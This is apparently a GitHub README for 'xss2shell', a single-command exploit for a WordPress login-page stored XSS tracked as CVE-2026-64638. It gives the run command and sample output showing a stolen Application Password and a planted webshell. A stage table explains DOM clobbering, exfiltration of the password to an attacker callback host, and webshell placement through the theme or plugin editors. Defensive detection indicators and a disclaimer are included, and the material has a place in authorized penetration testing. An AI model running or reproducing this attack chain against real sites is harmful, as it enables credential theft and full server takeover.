<div align="center">

<img src="img/banner.svg" alt="xss2shell" width="700">

<br><br>

[![CVE](https://img.shields.io/badge/CVE--2026--64638-CRITICAL-red?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2026-64638)
[![WordPress](https://img.shields.io/badge/WordPress-%3C_7.0.3-blue?style=for-the-badge&logo=wordpress)](https://wordpress.org)
[![Python](https://img.shields.io/badge/Python-3.8+-yellow?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

Every public PoC for this CVE is broken. **This one works.**

[The Bug](#the-bug) · [Quick Start](#quick-start) · [How It Works](#how-it-works) · [Limitations](#limitations)

</div>

---

## The Bug

WordPress < 7.0.3 does not sanitize the `log` (username) parameter in `wp-login.php`. The value is stored and rendered inside the admin's authenticated session — a **pre-auth stored XSS** that chains to full server takeover with a single click.

```
Victim clicks lure  --->  XSS fires  --->  App Password stolen  --->  Shell planted  --->  RCE
```

## Quick Start

```bash
# Zero dependencies. Pure Python 3.
python xss2shell.py -t http://target.com -c "id"
```

<details>
<summary><b>Example output</b></summary>

```
[*] Target: http://target.com
[+] WordPress login found
[+] Listening on 192.168.1.5:9443
[*] Send this to the admin -> http://192.168.1.5:9443/
[*] Waiting for victim ...
[+] Victim opened the attacker page
[+] XSS payload POSTed to wp-login.php
[+] Application Password stolen: user=admin pass=XXXX XXXX XXXX XXXX
[+] Theme editor -> webshell in functions.php

============================================================
[+] RCE via theme
[+] $ id
------------------------------------------------------------
uid=33(www-data) gid=33(www-data) groups=33(www-data)
============================================================

[+] Shell -> http://target.com/?xss2shell_cmd=whoami
[+] Done.
```

</details>

## Usage

```
usage: xss2shell.py [-h] -t TARGET -c COMMAND [--lhost IP] [--lport PORT] [--keep]

  -t, --target    Target WordPress URL
  -c, --command   OS command to execute on the server
  --lhost         Attacker callback IP (default: auto-detect)
  --lport         Attacker callback port (default: random)
  --keep          Don't clean up artifacts after exploitation
```

## How It Works

| Stage | Action | Detail |
|-------|--------|--------|
| **1. XSS** | Inject via `wp-login.php` | Crafted `log` param with DOM clobbering (`<area id=ajaxurl>`) hijacks WP's AJAX URL, auto-clicking the App Password approval via JSONP |
| **2. Steal** | Application Password exfil | `authorize-application.php` silently creates an App Password; `success_url` sends it to the attacker |
| **3. Shell** | Write webshell (3 fallbacks) | **Theme editor** → `functions.php` · **Plugin upload** → `xss2shell/shell.php` · **Plugin editor** → existing plugin file |
| **4. RCE** | Execute OS commands | Webshell runs `shell_exec()`, returns JSON output, tool auto-verifies and cleans up |

## Affected Versions

| Version | Status |
|---------|--------|
| WordPress **< 7.0.3** | **Vulnerable** |
| WordPress >= 7.0.3 | Patched |

## Limitations

| Condition | Impact |
|-----------|--------|
| `DISALLOW_FILE_EDIT` | Theme/plugin editors blocked — only ZIP upload works |
| `DISALLOW_FILE_MODS` | All 3 methods blocked — no RCE |
| WAF (Cloudflare, Wordfence) | May filter XSS payload or webshell requests |
| `disable_functions` in PHP | `shell_exec` blocked — empty output |
| Pop-up blocker | Breaks the popup chain |
| Strict CSP headers | Blocks inline JS or cross-origin fetch |

## Detection

Look for these indicators if xss2shell was used against your site:

- Application Password for app name `XSS2Shell-Poc-Wordsec`
- Plugin `xss2shell` in `wp-content/plugins/`
- String `xss2shell_cmd` in `functions.php` or any plugin file
- JSONP requests to `/?rest_route=/&_method=GET&_jsonp=`

## Why This Exists

Every public PoC for CVE-2026-64638 stops at `alert(1)` or requires manual steps no triager can reproduce. This tool delivers **full chain exploitation in a single command** — from zero auth to RCE. Built for security researchers who need proof, not theory.

## Disclaimer

For **authorized security testing and educational purposes only**. Only use against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

---

<div align="center">

**[WordSec](https://wordsec.net)** · CVE-2026-64638 · Patched in WordPress 7.0.3

</div>
